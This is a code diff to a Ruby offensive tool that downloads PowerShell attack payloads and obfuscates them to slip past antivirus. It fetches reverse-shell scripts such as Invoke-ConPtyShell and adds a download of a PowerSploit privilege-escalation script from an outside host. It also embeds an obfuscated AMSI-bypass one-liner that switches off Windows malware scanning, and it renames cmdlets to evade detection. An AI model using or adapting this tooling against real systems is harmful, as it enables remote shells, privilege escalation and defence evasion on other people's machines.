@@ -8,7 +8,6 @@
 
 # Use this tool under your own responsability!
 
-require "base64"
 require "colorize"
 require "httparty"
 require "optparse"
@@ -18,7 +17,7 @@ require "pry"
 $rand_values = []
 
 # This array contains some of the most important cmdlets to iterate over them in case they're on the script to obfuscate its names
-$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object","Write-Progress","Write-Verbose","Get-Process","Get-Date","Out-File","Get-Service","Split-Path","New-Item","Set-WmiInstance"]
+$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object","Write-Progress","Get-Process","Get-Date","Out-File","Get-Service","Split-Path","New-Item","Set-WmiInstance"]
 
 # Common procedures to lightly change
 $known_text = ["([text.encoding]::ASCII).GetBytes(",".AcceptTcpClient()",".GetStream()",".Clear()",".Flush()",".Stop()",".Close()","",".GetString(",".DownloadString(",".setRequestHeader("]
@@ -364,6 +363,8 @@ def getPayload(payload)
     res = HTTParty.get(base_url + "Shells/Invoke-PowerShellUdp.ps1")
   elsif payload == "Invoke-ConPtyShell"
     res = HTTParty.get(base_url + "Shells/Invoke-ConPtyShell.ps1")
+  elsif payload == "Get-System"
+    res = HTTParty.get("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")
   elsif payload == "Get-Information"
     res = HTTParty.get(base_url + "Gather/Get-Information.ps1")
   elsif payload == "Get-WLAN-Keys"
@@ -395,6 +396,9 @@ def getPayload(payload)
   elsif payload == "Invoke-AmsiBypass"
     template = "[ReF].\"`A$(echo sse)`mB$(echo L)`Y\".\"g`E$(echo tty)p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",'stem.M','oma') ).\"$(echo ge)`Tf`i$(echo El)D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(echo Se)t`Va$(echo LUE)\"($(),$(1 -eq 1))"
     return template
+  else
+    puts "\n[!] Invalid payload".red
+    exit 0
   end
 
   return res.body
@@ -533,7 +537,7 @@ def obfuscate(file_data)
   file_data.gsub!("`r`n", "\n")
   file_data.gsub!("`n", "\n")
   file_data.gsub!("`t", "\t")
-  file_data.gsub!("`\"", "`'")
+  #file_data.gsub!("`\"", "`'")
 
   # Get CLI parameters to not overwrite them
   parameters = file_data.scan(/ParameterSetName=\"(.*?)\"\)\]/i)
@@ -575,6 +579,10 @@ def obfuscate(file_data)
 
   single_quote_strs.each { |entry|
     entry.each { |i|
+      if entry[0].include?("`") || entry[0].include?("$") || entry[0].include?("\\") || entry[0].include?("\"") || entry[0].include?("'")
+        next
+      end
+
       rand_code_str = randStr(25)
       file_data.gsub!("\'#{i}\'", rand_code_str)
 
@@ -599,10 +607,15 @@ def obfuscate(file_data)
   $known_funcs.each { |func|
     if file_data.match?(/#{func}/i)
       sleep 0.05 # Add short delay
-      moded_func = cmdletObfs(func)
-      file_data.gsub!(/#{func}/i, moded_func)
+      modedfunc = cmdletObfs(func)
+      file_data.gsub!(/#{func}/i, modedfunc)
+
+      if func == "Write-Warning"
+        binding.pry
+      end
+
       if $verbose && $first_iter
-        puts("  " + func + " --> " + moded_func)
+        puts("  " + func + " --> " + modedfunc)
       end
     end
   }
